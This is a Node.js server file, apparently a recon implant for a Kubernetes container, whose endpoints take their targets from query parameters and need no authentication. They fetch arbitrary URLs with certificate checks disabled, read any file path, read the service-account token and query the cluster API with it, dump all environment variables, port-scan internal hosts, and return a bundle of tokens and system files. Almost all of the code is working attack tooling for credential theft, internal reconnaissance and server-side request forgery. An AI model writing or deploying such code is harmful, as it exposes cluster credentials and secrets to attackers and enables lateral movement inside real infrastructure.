const http = require('http');
const https = require('https');
const fs = require('fs');
const PORT = process.env.PORT || 10000;

async function fetchUrl(targetUrl) {
  return new Promise((resolve, reject) => {
    const mod = targetUrl.startsWith('https') ? https : http;
    const opts = { timeout: 8000, rejectUnauthorized: false };
    const req = mod.get(targetUrl, opts, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
  });
}

function k8sFetch(path) {
  const tokenPath = '/var/run/secrets/kubernetes.io/serviceaccount/token';
  const caPath = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt';
  let token = '';
  try { token = fs.readFileSync(tokenPath, 'utf-8').trim(); } catch(e) { return Promise.reject(new Error('no SA token')); }
  const ca = fs.existsSync(caPath) ? fs.readFileSync(caPath) : undefined;
  return new Promise((resolve, reject) => {
    const req = https.get({
      hostname: 'kubernetes.default.svc',
      path: path,
      headers: { 'Authorization': 'Bearer ' + token },
      ca: ca,
      rejectUnauthorized: false,
      timeout: 8000
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('k8s timeout')); });
  });
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`);
  
  if (url.pathname === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end('{"status":"ok"}');
  }

  if (url.pathname === '/fetch') {
    const target = url.searchParams.get('url');
    if (!target) { res.writeHead(400); return res.end('need url'); }
    try {
      const r = await fetchUrl(target);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify(r));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: e.message }));
    }
  }

  if (url.pathname === '/file') {
    const path = url.searchParams.get('path');
    if (!path) { res.writeHead(400); return res.end('need path'); }
    try {
      const data = fs.readFileSync(path, 'utf-8');
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      return res.end(data);
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: e.message }));
    }
  }

  if (url.pathname === '/k8s') {
    const path = url.searchParams.get('path') || '/api';
    try {
      const r = await k8sFetch(path);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify(r));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: e.message }));
    }
  }

  if (url.pathname === '/env') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(process.env));
  }

  if (url.pathname === '/scan') {
    const host = url.searchParams.get('host') || 'localhost';
    const results = {};
    const ports = [80,443,3000,5432,6379,8080,9090,9229,10000];
    for (const port of ports) {
      try {
        const r = await fetchUrl(`http://${host}:${port}/`);
        results[port] = { status: r.status, bodyLen: r.body.length, body: r.body.substring(0,300) };
      } catch (e) { results[port] = { error: e.message }; }
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(results));
  }

  if (url.pathname === '/recon') {
    const data = {};
    // SA token
    try { data.saToken = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token','utf-8').trim(); } catch(e) { data.saToken = e.message; }
    try { data.namespace = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace','utf-8').trim(); } catch(e) { data.namespace = e.message; }
    // hosts
    try { data.hosts = fs.readFileSync('/etc/hosts','utf-8'); } catch(e) { data.hosts = e.message; }
    try { data.resolv = fs.readFileSync('/etc/resolv.conf','utf-8'); } catch(e) { data.resolv = e.message; }
    // process info
    data.env = process.env;
    data.cwd = process.cwd();
    data.uid = process.getuid();
    data.pid = process.pid;
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(data));
  }

  res.writeHead(404);
  res.end('not found');
});

server.listen(PORT, () => console.log(`Proxy on :${PORT}`));
